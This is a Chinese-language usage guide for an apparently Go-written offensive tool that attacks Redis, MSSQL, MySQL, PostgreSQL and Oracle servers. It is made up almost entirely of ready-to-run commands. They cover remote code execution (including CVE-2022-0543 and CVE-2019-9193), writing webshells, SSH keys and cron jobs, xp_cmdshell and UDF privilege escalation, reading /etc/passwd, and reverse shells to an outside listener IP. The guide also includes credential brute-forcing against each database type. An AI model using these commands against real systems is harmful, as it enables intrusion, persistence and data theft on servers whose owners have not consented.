## Redis
### 连接redis获取sql shell
```shell
go run .\main.go -redis -rhost 192.168.111.211 -rport 6379 -cli
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673162384827-437c4b52-f054-4dac-82fb-2ebd6c5e1db6.png#averageHue=%232d2c2c&clientId=u67188ca8-ad41-4&from=paste&height=227&id=u6a32632c&name=image.png&originHeight=340&originWidth=1748&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61401&status=done&style=none&taskId=u9ce98198-9c8b-40f0-b330-f72a23aee6a&title=&width=1165.3333333333333)
### 主从复制RCE
```shell
//Linux
go run .\main.go -redis  -rhost 192.168.111.211  -lhost 192.168.1.110 -exec -so exp.so
go run .\main.go -redis  -rhost 192.168.111.211  -lhost 192.168.1.110 -exec -console -so exp.so
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673168621037-f35fbab0-d512-4091-84d0-69a8bead823c.png#averageHue=%232c2c2c&clientId=u67188ca8-ad41-4&from=paste&height=593&id=uf2330416&name=image.png&originHeight=890&originWidth=1767&originalType=binary&ratio=1&rotation=0&showTitle=false&size=151041&status=done&style=none&taskId=u8e73d49b-85ea-4c1b-994b-c094dcbd9ea&title=&width=1178)
### Lua沙盒绕过命令执行(CVE-2022-0543)
```shell
go run .\main.go -redis -rhost 192.168.111.211 -rport 6379 -lua -console
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673169147330-646d29f4-b9f5-43f7-bec9-f455d204ee99.png#averageHue=%232c2c2c&clientId=u67188ca8-ad41-4&from=paste&height=263&id=ubf42c5a7&name=image.png&originHeight=395&originWidth=1540&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56558&status=done&style=none&taskId=u3c8fa367-3e93-498a-9223-fc0b4576281&title=&width=1026.6666666666667)
### 写公钥
将ssh.txt文件中公钥替换成自己生成的
```shell
go run .\main.go -redis -rhost 192.168.111.211 -rport 6379 -sshkey
```
### 写Webshell
```shell
go run .\main.go -redis -rhost 192.168.111.211 -rport 6379 -shell
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673172455308-4d7d1f2b-25ec-4ff2-9002-37a951006a64.png#averageHue=%232c2c2c&clientId=u4db9b2af-90c3-4&from=paste&height=637&id=ue060e558&name=image.png&originHeight=956&originWidth=1678&originalType=binary&ratio=1&rotation=0&showTitle=false&size=151014&status=done&style=none&taskId=u9d4fbe22-3293-4f4c-9d0c-3c53c03d080&title=&width=1118.6666666666667)
### 定时任务
需要修改crontab.txt内容
```shell
go run .\main.go -redis -rhost 192.168.111.211 -rport 6379 -crontab
```
## MSSQL
### 连接数据库并获取一个sql shell
```shell
go run .\main.go -mssql -rhost 192.168.111.223 -rport 1433 -ruser sa -pwd "1qaz@WSX"  -cli
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1675177766048-6b3b73c8-78d4-4e09-b9ff-de880da2d1d4.png#averageHue=%232d2d2c&clientId=uf3dc0733-6a37-4&from=paste&height=357&id=u24708bb9&name=image.png&originHeight=536&originWidth=1769&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112663&status=done&style=none&taskId=u50b40e50-727f-42ee-91e5-c0979786901&title=&width=1179.3333333333333)
### 开启xp_cmdshell
```shell
go run .\main.go -mssql -rhost 192.168.111.136 -rport 1433 -pwd "1qaz@WSX" -isxp
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673028201084-80b53f0e-8e02-4263-8f06-f24776514701.png#averageHue=%232e2d2c&clientId=u08da9ee0-8226-4&from=paste&height=307&id=udc10c4d2&name=image.png&originHeight=461&originWidth=1819&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106608&status=done&style=none&taskId=u8199fc07-72ea-4c05-b76f-92c07ea77f2&title=&width=1212.6666666666667)
### xp_cmdshell获取一个执行系统命令的shell
```shell
go run .\main.go -mssql -rhost 192.168.111.136 -rport 1433 -pwd "1qaz@WSX" -isxp -console
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673028316198-6dc5a19d-4c93-4d62-aef4-80f027530067.png#averageHue=%232d2d2c&clientId=u08da9ee0-8226-4&from=paste&height=276&id=ucb4936fc&name=image.png&originHeight=414&originWidth=1591&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89465&status=done&style=none&taskId=ud51186ff-df6b-4166-9347-f5c0c4d2e1c&title=&width=1060.6666666666667)
### xp_cmdshell执行单条系统命令
```shell
go run .\main.go -mssql -rhost 192.168.111.136 -rport 1433 -pwd "1qaz@WSX"  -isxp -docmd -cmd "whoami"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673028373704-771c27d7-1c70-4359-818f-f5ee934c03fc.png#averageHue=%232d2d2c&clientId=u08da9ee0-8226-4&from=paste&height=259&id=uf0957005&name=image.png&originHeight=389&originWidth=1786&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86227&status=done&style=none&taskId=u164f0020-29d3-40a2-a39a-b1dae0192d2&title=&width=1190.6666666666667)
### 开启sp_oacreate
```shell
go run main.go -mssql -rhost 192.168.111.136 -rport 1433 -pwd "1qaz@WSX" -issp
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673028504490-a80fce4f-dec8-45ed-bf1d-cb8ddada1bf9.png#averageHue=%232e2d2c&clientId=u08da9ee0-8226-4&from=paste&height=264&id=u43df7f3c&name=image.png&originHeight=396&originWidth=1918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=103785&status=done&style=none&taskId=u5cc1b732-ac3e-4e06-b1a9-21d318445ea&title=&width=1278.6666666666667)
### sp_oacreate获取一个执行系统命令的shell
```shell
go run .\main.go -mssql -rhost 192.168.111.136 -rport 1433 -pwd "1qaz@WSX" -issp -console
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673028597527-1f4a86ad-f2e3-474f-bc14-1b72d99b2509.png#averageHue=%232d2c2c&clientId=u08da9ee0-8226-4&from=paste&height=471&id=ub3f49863&name=image.png&originHeight=707&originWidth=2232&originalType=binary&ratio=1&rotation=0&showTitle=false&size=159682&status=done&style=none&taskId=uf13f8f08-71a6-4091-8f2a-cde092c92f1&title=&width=1488)
### sp_oacreate执行单条系统命令
```shell
go run main.go -mssql -rhost 192.168.111.136 -rport 1433 -pwd "1qaz@WSX"  -issp -docmd -cmd "whoami"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673028782184-2beee226-5d8a-449f-aac8-f92ffba184d7.png#averageHue=%232d2c2c&clientId=u08da9ee0-8226-4&from=paste&height=421&id=u56eedfb9&name=image.png&originHeight=632&originWidth=2319&originalType=binary&ratio=1&rotation=0&showTitle=false&size=146388&status=done&style=none&taskId=u408d7e26-3620-47ab-82de-2c641f0c855&title=&width=1546)
### CLR获取一个执行系统命令的shell
```shell
go run .\main.go -mssql -rhost 192.168.111.136 -rport 1433 -pwd "1qaz@WSX" -isclr -console
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673029296087-5b97dcab-b004-4e78-9477-7ae2d9079867.png#averageHue=%232d2d2c&clientId=u08da9ee0-8226-4&from=paste&height=438&id=u9b24b4c0&name=image.png&originHeight=657&originWidth=1832&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142685&status=done&style=none&taskId=ua7222524-b6ac-44d8-833d-b9ce6134d74&title=&width=1221.3333333333333)
### CLR执行单条系统命令
```shell
go run main.go -mssql -rhost 192.168.111.136 -rport 1433 -pwd "1qaz@WSX"  -isclr -docmd -cmd "whoami"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673029487512-084efe55-dff3-46fd-a2bd-ee4c15bc0408.png#averageHue=%232d2d2c&clientId=u08da9ee0-8226-4&from=paste&height=395&id=u28f01cec&name=image.png&originHeight=592&originWidth=1827&originalType=binary&ratio=1&rotation=0&showTitle=false&size=137314&status=done&style=none&taskId=u1fe330da-bef3-433f-b6e6-058b30d7f7e&title=&width=1218)
### log备份写getshell
```shell
go run .\main.go -mssql -rhost 192.168.111.136 -rport 1433 -pwd "1qaz@WSX" -shell -logshell -path "C:\phpStudy\WWW\aa.php" -e 'php'
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673029630310-7157f5fd-a6d1-4180-a2ab-82365975599a.png#averageHue=%232d2c2c&clientId=u08da9ee0-8226-4&from=paste&height=376&id=u99c99882&name=image.png&originHeight=564&originWidth=2156&originalType=binary&ratio=1&rotation=0&showTitle=false&size=138324&status=done&style=none&taskId=u57002ca6-f2e2-4fe4-927b-55b6f1e8c54&title=&width=1437.3333333333333)
### 差异备份getshell

```shell
go run .\main.go -mssql -rhost 192.168.111.136 -rport 1433 -pwd "1qaz@WSX" -difshell -path "C:\phpStudy\WWW\shell.php" -e 'php'
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673029787485-9fd603ad-2644-4d3e-85ca-0995f620b4eb.png#averageHue=%232d2c2c&clientId=u08da9ee0-8226-4&from=paste&height=335&id=u548fd650&name=image.png&originHeight=502&originWidth=2102&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121883&status=done&style=none&taskId=udec3fc47-ddfc-4d5b-9628-8e351de57c0&title=&width=1401.3333333333333)
## SSH连接
```shell
go run .\main.go -ssh -ruser root -rhost 192.168.111.139 -pwd "1qaz@WSX"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673030022732-c37f6580-12e8-4262-861e-936263fdf94d.png#averageHue=%232c2c2b&clientId=u08da9ee0-8226-4&from=paste&height=463&id=ua7a42f48&name=image.png&originHeight=694&originWidth=1811&originalType=binary&ratio=1&rotation=0&showTitle=false&size=103526&status=done&style=none&taskId=uada5ae58-8e86-44dd-af4f-6e631ae5dfe&title=&width=1207.3333333333333)
## Mysql
### 连接获取sql shell
```shell
go run .\main.go -mysql -ruser root -rhost 192.168.111.134 -pwd "root" -rport 3306 -cli
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673030365697-3c1c72c2-fe1b-43ce-89ac-06feac0548b5.png#averageHue=%232c2b2b&clientId=u08da9ee0-8226-4&from=paste&height=238&id=u7c6e2300&name=image.png&originHeight=357&originWidth=1676&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45044&status=done&style=none&taskId=ub8d468ed-b2e8-4cd8-8c3e-8d2143dcdb7&title=&width=1117.3333333333333)
### into out file获取webshell
```shell
go run .\main.go -mysql -ruser root -rhost 192.168.111.136 -pwd "root" -rport 3306 -shell -outfileshell -path "C:\\\\phpStudy\\\\WWW\\\\\aaa.php"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673030645785-1b594344-6002-410a-921d-f8efc3901bb2.png#averageHue=%232d2d2c&clientId=u08da9ee0-8226-4&from=paste&height=293&id=u4f764585&name=image.png&originHeight=439&originWidth=2476&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117107&status=done&style=none&taskId=ub72efd5b-a58d-4cfc-b02a-7408b84a0cb&title=&width=1650.6666666666667)
### 全局日志getshell
```shell
go run .\main.go -mysql -ruser root -rhost 192.168.111.136 -pwd "root" -rport 3306 -shell -generallog -path C:\\\\phpStudy\\\\WWW\\\\aam.php
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673030756036-47074c66-a11d-4019-adfc-4ac3727659b5.png#averageHue=%232c2c2b&clientId=u08da9ee0-8226-4&from=paste&height=269&id=udb7af4ba&name=image.png&originHeight=403&originWidth=2296&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87296&status=done&style=none&taskId=uaf8c1a39-31a0-49f4-8524-40873034fec&title=&width=1530.6666666666667)
### udf提权
```shell
go run .\main.go -mysql -ruser root -rhost 192.168.111.136 -pwd "root" -rport 3306 -udf
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673031307685-e3ce68e6-73f8-40eb-9297-51ab60415098.png#averageHue=%232d2c2c&clientId=u08da9ee0-8226-4&from=paste&height=512&id=uc2bcd055&name=image.png&originHeight=768&originWidth=1732&originalType=binary&ratio=1&rotation=0&showTitle=false&size=155085&status=done&style=none&taskId=ud0b58534-3ee7-4879-82e5-205a25f2ff1&title=&width=1154.6666666666667)
## postgresql
### 连接postgre数据库获取sql shell
```shell
go run main.go -postgre -ruser  "postgres" -pwd "postgres" -rhost 192.168.111.162 -rport "5432" -cli
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673160848120-fd598941-e7a8-456f-bb5b-c41bdeaecc93.png#averageHue=%232d2d2c&clientId=u67188ca8-ad41-4&from=paste&height=307&id=u56542eca&name=image.png&originHeight=460&originWidth=2071&originalType=binary&ratio=1&rotation=0&showTitle=false&size=107639&status=done&style=none&taskId=u881db7a3-6cf0-4448-924e-ed59a618da9&title=&width=1380.6666666666667)
### 利用CVE-2019-9193循环执行命令
```shell
go run main.go -postgre -ruser  "postgres" -pwd "postgres" -rhost 192.168.111.139 -rport "5432" -CVE20199193 -console
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673160917125-06586a4d-3256-42e9-9956-db1e36ca7b8d.png#averageHue=%232d2d2c&clientId=u67188ca8-ad41-4&from=paste&height=336&id=uf546e084&name=image.png&originHeight=504&originWidth=2019&originalType=binary&ratio=1&rotation=0&showTitle=false&size=126344&status=done&style=none&taskId=u9e7e6f41-650e-432e-839c-6612b81b65c&title=&width=1346)
### 利用CVE-2019-9193执行单条命令
```shell
go run main.go -postgre -ruser  "postgres" -pwd "postgres" -rhost 192.168.111.139 -rport "5432" -CVE20199193 -cmd "pwd"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673161033085-4ab426eb-558c-47b9-a5d0-a4b29098b69e.png#averageHue=%232d2d2c&clientId=u67188ca8-ad41-4&from=paste&height=265&id=uced0c31e&name=image.png&originHeight=398&originWidth=2105&originalType=binary&ratio=1&rotation=0&showTitle=false&size=109865&status=done&style=none&taskId=u86817218-9b22-4ac6-a084-8bc69b2a101&title=&width=1403.3333333333333)
### 单次文件读取(方法一)
```shell
go run main.go -postgre -ruser  "postgres" -pwd "postgres" -rhost 192.168.111.139 -rport "5432" -read1 -file "/etc/passwd"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673161149239-1f78ce81-d03d-42ec-8d0e-0bd4649ecd62.png#averageHue=%232d2c2c&clientId=u67188ca8-ad41-4&from=paste&height=680&id=u8e990df0&name=image.png&originHeight=1020&originWidth=2190&originalType=binary&ratio=1&rotation=0&showTitle=false&size=210671&status=done&style=none&taskId=u63e87976-5a9f-439c-adb3-5414fc68dbf&title=&width=1460)
### 循环文件读取(方法一)
```shell
go run main.go -postgre -ruser  "postgres" -pwd "postgres" -rhost 192.168.111.139 -rport "5432" -read1 -console
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673161239356-65b45cb0-3f97-44f4-83e6-dc937a835dff.png#averageHue=%232d2c2c&clientId=u67188ca8-ad41-4&from=paste&height=719&id=u195ced09&name=image.png&originHeight=1078&originWidth=2235&originalType=binary&ratio=1&rotation=0&showTitle=false&size=226870&status=done&style=none&taskId=u866bcede-0111-422c-85d7-ae027662f44&title=&width=1490)
### 单次文件读取(方法二)
```shell
go run main.go -postgre -ruser  "postgres" -pwd "postgres" -rhost 192.168.111.139 -rport "5432" -read2 -file "/etc/passwd"
```
把hex值转换string即为结果
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673161361614-52b060b2-f9cb-4344-ab9b-15fef9b73d87.png#averageHue=%23302f2e&clientId=u67188ca8-ad41-4&from=paste&height=568&id=ud5083910&name=image.png&originHeight=852&originWidth=2492&originalType=binary&ratio=1&rotation=0&showTitle=false&size=222519&status=done&style=none&taskId=ua2ef94f7-6c84-430f-900f-bd6915af25d&title=&width=1661.3333333333333)
### 循环文件读取(方法二)
```shell
go run main.go -postgre -ruser  "postgres" -pwd "postgres" -rhost 192.168.111.139 -rport "5432" -read2 -console
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673161442923-657ff922-0990-4071-84ad-0a1e3cab1409.png#averageHue=%23302f2e&clientId=u67188ca8-ad41-4&from=paste&height=598&id=uccac852c&name=image.png&originHeight=897&originWidth=2474&originalType=binary&ratio=1&rotation=0&showTitle=false&size=230880&status=done&style=none&taskId=u236bbaee-3851-40d5-ae81-aa2c5d75e03&title=&width=1649.3333333333333)
### 列目录
```shell
go run main.go -postgre -ruser  "postgres" -pwd "postgres" -rhost 192.168.111.139 -rport "5432" -list -file "./"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673161496940-22009d1c-0290-4448-8cdf-ae6b161753d6.png#averageHue=%232c2b2b&clientId=u67188ca8-ad41-4&from=paste&height=661&id=u894f9629&name=image.png&originHeight=991&originWidth=2314&originalType=binary&ratio=1&rotation=0&showTitle=false&size=134912&status=done&style=none&taskId=u2101e801-9ce2-46f9-9eac-8eb0ca8d57d&title=&width=1542.6666666666667)
### 循环列目录
```shell
go run main.go -postgre -ruser  "postgres" -pwd "postgres" -rhost 192.168.111.139 -rport "5432" -list -console
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673161555557-09ef072c-6942-4851-9d13-98c41f0551e1.png#averageHue=%232c2b2b&clientId=u67188ca8-ad41-4&from=paste&height=747&id=u3fe96a4b&name=image.png&originHeight=1121&originWidth=2302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=151516&status=done&style=none&taskId=udee2f48a-0781-4199-8b99-3ef9c866556&title=&width=1534.6666666666667)
### 上传webshell
```shell
go run main.go -postgre -ruser  "postgres" -pwd "postgres" -rhost 192.168.111.139 -rport "5432" -write -uploadpath "/tmp/shell.jsp" -e "jsp"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673161636103-34acc8f7-e097-4452-8e7c-4de12bbc4d70.png#averageHue=%232e2d2c&clientId=u67188ca8-ad41-4&from=paste&height=222&id=uaa70f9de&name=image.png&originHeight=333&originWidth=2230&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95815&status=done&style=none&taskId=u71252157-f05e-4b2b-9209-e57a8af5b27&title=&width=1486.6666666666667)
## Oracle
使用之前需要安装oracle客户端
Windows下安装方法
解压下载的instantclient_21_8压缩包，将解压路径添加到系统变量path
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673773289868-162dccdc-7921-411e-af11-64544ccbef02.png#averageHue=%23f4f3f3&clientId=u5d6a75f5-9ab0-4&from=paste&height=517&id=u5303451a&name=image.png&originHeight=775&originWidth=805&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43600&status=done&style=none&taskId=u2f1ad378-696d-4c46-8e50-b6e9c1fd3ec&title=&width=536.6666666666666)
Linux下正常支持Redis、Mysql、SQL Server、Postgresql，如想使用Oracle功能需要安装Oracle客户端驱动。在Kali下所有功能可完美运行
### 获取sql shell
```shell
go run .\main.go -oracle -rhost 192.168.111.139 -rport 1521 -ruser test -pwd "1qaz@WSX" -sid helowin -cli
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673429766059-8e2694dc-45e6-4831-bf09-46e47c1fde9e.png#averageHue=%232d2c2c&clientId=uc11344e2-a856-4&from=paste&height=244&id=u40101f1d&name=image.png&originHeight=366&originWidth=2338&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87190&status=done&style=none&taskId=u7a07727f-1939-468d-944c-6c7385e2735&title=&width=1558.6666666666667)
### DBMS_Export_Extention循环执行命令
```shell
go run .\main.go -oracle -rhost 192.168.111.139 -rport 1521 -ruser system -pwd "1qaz@WSX" -sid lhr10g -dee -console
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673623715612-8428c8a4-9c1a-4efe-be9a-cafe5f1fd94d.png#averageHue=%232c2c2b&clientId=ucbc34b69-4b9d-4&from=paste&height=331&id=u80060969&name=image.png&originHeight=496&originWidth=2300&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91240&status=done&style=none&taskId=u687dcb39-23a8-4567-af69-305fdd630e8&title=&width=1533.3333333333333)
### DBMS_Export_Extention执行单条命令
```shell
go run .\main.go -oracle -rhost 192.168.111.139 -rport 1521 -ruser system -pwd "1qaz@WSX" -sid lhr10g -dee -docmd -cmd "whoami"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673623778177-7653f045-c758-4026-a40a-092c35df1d8a.png#averageHue=%232d2c2c&clientId=ucbc34b69-4b9d-4&from=paste&height=192&id=u98a61877&name=image.png&originHeight=288&originWidth=2351&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70891&status=done&style=none&taskId=uf0fb5e73-b82c-4db2-8bd3-d6425c7bf2c&title=&width=1567.3333333333333)
### DBMS_Export_Extention反弹shell
```shell
go run .\main.go -oracle -rhost 192.168.111.139 -rport 1521 -ruser system -pwd "1qaz@WSX" -sid lhr10g -lhost 175.178.233.198 -lport 7776 -dee -re
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673623842582-d0b94370-e3b0-49fa-ba62-47f8eb4d580e.png#averageHue=%232d2d2c&clientId=ucbc34b69-4b9d-4&from=paste&height=145&id=u7b0096c1&name=image.png&originHeight=218&originWidth=2245&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62363&status=done&style=none&taskId=u9f895e81-de70-4f46-bec8-4efd8325a67&title=&width=1496.6666666666667)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673623859445-d8046463-699e-4655-89fe-995233d94ecc.png#averageHue=%231c3345&clientId=ucbc34b69-4b9d-4&from=paste&height=121&id=uc775ec0e&name=image.png&originHeight=181&originWidth=912&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153479&status=done&style=none&taskId=ubcddcba3-563a-417f-9bad-cdf5d097250&title=&width=608)
### DBMS_XMLQUERY循环执行系统命令
```shell
go run .\main.go -oracle -rhost 192.168.111.139 -rport 1521 -ruser system -pwd "1qaz@WSX" -sid lhr10g -dx -console
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673623939528-8eba3e38-34b9-4e52-8799-bb3d1509fa5e.png#averageHue=%232d2c2c&clientId=ucbc34b69-4b9d-4&from=paste&height=359&id=u95d5e0ce&name=image.png&originHeight=539&originWidth=2247&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112317&status=done&style=none&taskId=u5f887f71-3333-4988-8d50-67663f3ba69&title=&width=1498)
### DBMS_XMLQUERY执行单条系统命令
```shell
go run .\main.go -oracle -rhost 192.168.111.139 -rport 1521 -ruser system -pwd "1qaz@WSX" -sid lhr10g -dx -docmd -cmd "whoami"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673624066692-d9d54ab0-7d3b-46c1-9a23-5456373d928d.png#averageHue=%232d2c2c&clientId=ucbc34b69-4b9d-4&from=paste&height=244&id=ud170fc40&name=image.png&originHeight=366&originWidth=2351&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88999&status=done&style=none&taskId=u4e1a65c9-08aa-4c34-883f-4af769e6da2&title=&width=1567.3333333333333)
### 卸载命令执行函数
```shell
go run .\main.go -oracle -rhost 192.168.111.139 -rport 1521 -ruser system -pwd "1qaz@WSX" -sid lhr10g -del
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673624027931-10678763-bf42-472a-a91d-e640b3c1555f.png#averageHue=%232d2c2c&clientId=ucbc34b69-4b9d-4&from=paste&height=185&id=u230a0fb8&name=image.png&originHeight=277&originWidth=2261&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68992&status=done&style=none&taskId=u517c2117-9036-4b39-a465-b569c694f44&title=&width=1507.3333333333333)
### **dbms_java_test.funcall反弹shell**
```shell
 go run .\main.go -oracle -rhost 192.168.111.139 -rport 1521 -ruser system -pwd "1qaz@WSX" -sid lhr10g -lhost 175.178.233.198 -lport 7776 -fc 
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673624130369-ef91ff5e-7b6d-426d-9a4d-a195c4da0a32.png#averageHue=%232d2d2c&clientId=ucbc34b69-4b9d-4&from=paste&height=203&id=u7976a237&name=image.png&originHeight=304&originWidth=2287&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88970&status=done&style=none&taskId=u8c491d7c-1038-46ac-b415-fbf388a9431&title=&width=1524.6666666666667)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1673624155908-1da47b35-40eb-4b39-abc6-0aead14e962b.png#averageHue=%231e3648&clientId=ucbc34b69-4b9d-4&from=paste&height=117&id=uae5a3a14&name=image.png&originHeight=176&originWidth=1204&originalType=binary&ratio=1&rotation=0&showTitle=false&size=188379&status=done&style=none&taskId=ua91bf8ed-063e-4f7f-8ebd-1222742f0ae&title=&width=802.6666666666666)
## 爆破数据库账号密码
### Mysql
```
go run .\main.go -rhost 192.168.111.206 -rport 3306 -crack -m mysql
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1675176813163-edc698cf-4d8d-4ecd-b459-e6c3951d08a2.png#averageHue=%232d2c2c&clientId=uf3dc0733-6a37-4&from=paste&height=153&id=u8d9a68c6&name=image.png&originHeight=230&originWidth=1665&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51404&status=done&style=none&taskId=ud314a94b-753a-4325-bc31-c21e484e977&title=&width=1110)
### MSSQL
```shell
go run .\main.go -rhost 192.168.111.223 -rport 1433 -crack -m mssql
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1675183775890-0845515d-5a4c-475c-a28f-6e9bb6ea385e.png#averageHue=%232c2c2b&clientId=uf3dc0733-6a37-4&from=paste&height=483&id=u6fe135f5&name=image.png&originHeight=725&originWidth=1634&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141874&status=done&style=none&taskId=u0c8a6358-73a1-4a28-bf17-88a87d4b93f&title=&width=1089.3333333333333)
### Postgresql
```shell
go run .\main.go -rhost 192.168.111.211 -rport 5432 -crack -m postgresql
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1675183814719-c9714b53-1246-46f7-badd-da2ab5a4a829.png#averageHue=%232d2c2c&clientId=uf3dc0733-6a37-4&from=paste&height=751&id=u2a5aedcc&name=image.png&originHeight=1126&originWidth=1606&originalType=binary&ratio=1&rotation=0&showTitle=false&size=264923&status=done&style=none&taskId=u52ab6436-8908-4822-b0fd-ebc06ed4f59&title=&width=1070.6666666666667)
### Redis
```shell
go run .\main.go -rhost 192.168.111.211 -rport 6379 -crack -m redis
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1675183848971-060694b2-5666-436a-abd8-738254a1ba1e.png#averageHue=%232f2e2d&clientId=uf3dc0733-6a37-4&from=paste&height=49&id=u86edd1aa&name=image.png&originHeight=74&originWidth=1538&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23762&status=done&style=none&taskId=ubc61896d-0d4f-46f8-bfb9-bc38cb89d95&title=&width=1025.3333333333333)
### Oracle
```shell
go run .\main.go -rhost 192.168.111.211 -rport 1521 -crack -m oracle
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22017589/1675183934258-2ace77e2-b03f-4f51-8bb4-ab63ffb85793.png#averageHue=%232d2c2c&clientId=uf3dc0733-6a37-4&from=paste&height=209&id=ud7226210&name=image.png&originHeight=314&originWidth=2233&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83538&status=done&style=none&taskId=u42e7626e-4bf4-40b8-8f42-895a951d6ac&title=&width=1488.6666666666667)
